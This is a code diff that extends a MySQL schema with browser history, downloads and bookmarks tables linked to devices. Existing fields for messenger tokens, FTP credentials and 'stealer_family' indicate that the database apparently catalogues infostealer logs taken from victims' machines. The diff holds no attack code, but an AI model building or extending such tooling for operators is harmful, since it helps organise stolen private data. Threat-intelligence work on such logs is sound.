@@ -110,6 +110,9 @@ async function ensureDeviceStatisticsColumns() {
       "total_messenger_tokens INT DEFAULT 0",
       "total_ftp_credentials INT DEFAULT 0",
       "total_gaming_sessions INT DEFAULT 0",
+      "total_history INT DEFAULT 0",
+      "total_downloads INT DEFAULT 0",
+      "total_bookmarks INT DEFAULT 0",
     ]
 
     for (const column of columnsToAdd) {
@@ -477,6 +480,75 @@ async function createTables() {
       INDEX idx_device_id (device_id),
       INDEX idx_stealer_family (stealer_family),
       INDEX idx_created_at (created_at)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
+  `)
+
+  // Create browser history table
+  await executeQuery(`
+    CREATE TABLE IF NOT EXISTS browser_history (
+      id BIGINT AUTO_INCREMENT PRIMARY KEY,
+      device_id VARCHAR(255) NOT NULL,
+      url TEXT NOT NULL,
+      title TEXT,
+      visit_count INT DEFAULT 1,
+      last_visit_time BIGINT,
+      browser VARCHAR(255),
+      profile VARCHAR(255),
+      file_path TEXT,
+      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+      FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE,
+      INDEX idx_device_id (device_id),
+      INDEX idx_browser (browser),
+      INDEX idx_visit_count (visit_count),
+      INDEX idx_created_at (created_at),
+      FULLTEXT idx_url_title (url, title)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
+  `)
+
+  // Create downloads table
+  await executeQuery(`
+    CREATE TABLE IF NOT EXISTS downloads (
+      id BIGINT AUTO_INCREMENT PRIMARY KEY,
+      device_id VARCHAR(255) NOT NULL,
+      url TEXT NOT NULL,
+      file_path TEXT,
+      file_name VARCHAR(500),
+      total_bytes BIGINT,
+      start_time BIGINT,
+      end_time BIGINT,
+      state VARCHAR(50),
+      browser VARCHAR(255),
+      profile VARCHAR(255),
+      source_file TEXT,
+      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+      FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE,
+      INDEX idx_device_id (device_id),
+      INDEX idx_browser (browser),
+      INDEX idx_file_name (file_name(255)),
+      INDEX idx_created_at (created_at),
+      FULLTEXT idx_url (url)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
+  `)
+
+  // Create bookmarks table
+  await executeQuery(`
+    CREATE TABLE IF NOT EXISTS bookmarks (
+      id BIGINT AUTO_INCREMENT PRIMARY KEY,
+      device_id VARCHAR(255) NOT NULL,
+      url TEXT NOT NULL,
+      title TEXT,
+      date_added BIGINT,
+      folder VARCHAR(500),
+      browser VARCHAR(255),
+      profile VARCHAR(255),
+      file_path TEXT,
+      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+      FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE,
+      INDEX idx_device_id (device_id),
+      INDEX idx_browser (browser),
+      INDEX idx_folder (folder(255)),
+      INDEX idx_created_at (created_at),
+      FULLTEXT idx_url_title (url, title)
     ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
   `)
 }
